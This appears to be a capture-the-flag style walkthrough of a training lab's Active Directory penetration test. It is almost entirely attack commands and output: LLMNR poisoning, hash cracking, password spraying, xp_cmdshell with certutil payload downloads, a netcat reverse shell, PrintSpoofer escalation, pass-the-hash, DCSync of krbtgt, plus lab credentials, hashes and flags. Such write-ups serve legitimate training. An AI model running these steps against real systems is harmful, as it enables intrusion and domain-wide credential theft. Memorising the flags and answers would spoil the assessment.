## Scenario

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

### Solution
Pivot - 10.129.182.105 - htb-student:HTB_@cademy_stdnt!
Set up ligolo-ng.

```txt
Host discovery:
> netexec smb 172.16.7.0/23
SQL01 -> 172.16.7.60
MS01  -> 172.16.7.50
DC01  -> 172.16.7.3
WIN-250KA0VPJW6 -> 172.16.7.240

Run Responder on internat interface:
> sudo python3 /usr/share/responder/Responder.py -I ens224
AB920::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:010100000000000080807217BC4DD80128BCE65BE5F2DD84000000000200080036004A004500310001001E00570049004E002D00500049004D003500300048005300500046004A00530004003400570049004E002D00500049004D003500300048005300500046004A0053002E0036004A00450031002E004C004F00430041004C000300140036004A00450031002E004C004F00430041004C000500140036004A00450031002E004C004F00430041004C000700080080807217BC4DD80106000400020000000800300030000000000000000000000000200000C2EF82380450C5C35E0A85FDD7EC2C1B4D7467DB93379E10636AA575B9984C570A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000

> john hash rockyou.txt
AB920:weasal

> evil-winrm -u "AB920" -p 'weasal' -i "172.16.7.50"
*Evil-WinRM* PS C:\> cat flag.txt
aud1t_gr0up_m3mbersh1ps!

Get every users with rpcclient:
> rpcclient -U 'inlanefreight.htb/AB920%weasal' 172.16.7.3
> enumdomusers

Spray a common password for every user:
> netexec smb 172.16.7.3 -u users.txt -p 'Welcome1'
BR086:Welcome1

Spider shares again:
> netexec smb 172.16.7.3 -u BR086 -p 'Welcome1' --spider 'Department Shares' --content --pattern 'passw'
//172.16.7.3/Department Shares/IT/Private/Development/web.config [lastm:'2022-04-01 17:05' size:1203 offset:1203 pattern:'passw']
MSSQL: netdb:D@ta_bAse_adm1n!
 
 > sudo mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60
 SQL (netdb  dbo@master)> xp_cmdshell whoami /priv
 
 SeImpersonatePrivilege 
 
 So we can PrintSpoofer:
 ADD listener to ligolo to upload files:
 ligolo > listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
 
 mssql> xp_cmdshell "certutil -urlcache -f http://172.16.7.240:1235/nc64.exe c:\users\public\nc.exe"
 mssql> xp_cmdshell "certutil -urlcache -f http://172.16.7.240:1235/PrintSpoofer.exe c:\users\public\printspoofer.exe"
 
 Set up listener:
 mssql> xp_cmdshell C:\Users\Public\printspoofer.exe -c "C:\Users\Public\nc.exe 172.16.7.240 1235 -e cmd"
 
We got a shell as nt authority\system on SQL01. And we get the flags3imp3rs0nate_cl@ssic
 
Set up a meterpreter to use hashdump on target (Could use mimikatz lsadump::sam):
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:136b3ddfbb62cb02e53a8f661248f364:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::

We can pass the hash locally to dump lsass:
> netexec smb 172.16.7.60 -u Administrator -H 136b3ddfbb62cb02e53a8f661248f364 --local-auth -M lsassy
INLANEFREIGHT.LOCAL\mssqlsvc Sup3rS3cur3maY5ql$3rverE

> xfreerdp /v:172.16.7.50 /u:'mssqlsvc' /p:'Sup3rS3cur3maY5ql$3rverE' /drive:share,/workspace/CPTS/tmp

We have local admin foothold on MS01
We can ingest domain data with sharphound and upload it on bloodhound.
We see that CT059 have GenericAll on Domain Admins group

Let's run Inveigh (Windows responder) on host and we get:
CT059::INLANEFREIGHT:83909D3185412D32:439728518510E5114215FB3B7856B1F3:0101000000000000838484D0F956DC0162A61AD570B71C300000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800838484D0F956DC01060004000200000008003000300000000000000000000000002000001D45AB14EA3A73D76412FE4C4A12AF18E51CD52C1B54DAF5F546CEC3396677A10A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000

Crack hash:
CT059:charlie1

We have now GenericAll on Domains Admin:
Add CT059 to Domain Admins group with powerview.

Connect with psexec.py and get krbtgt ntlm via DCsync with Mimikatz
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
7eba70412d81c1cd030d72a3e8dbe05f
```

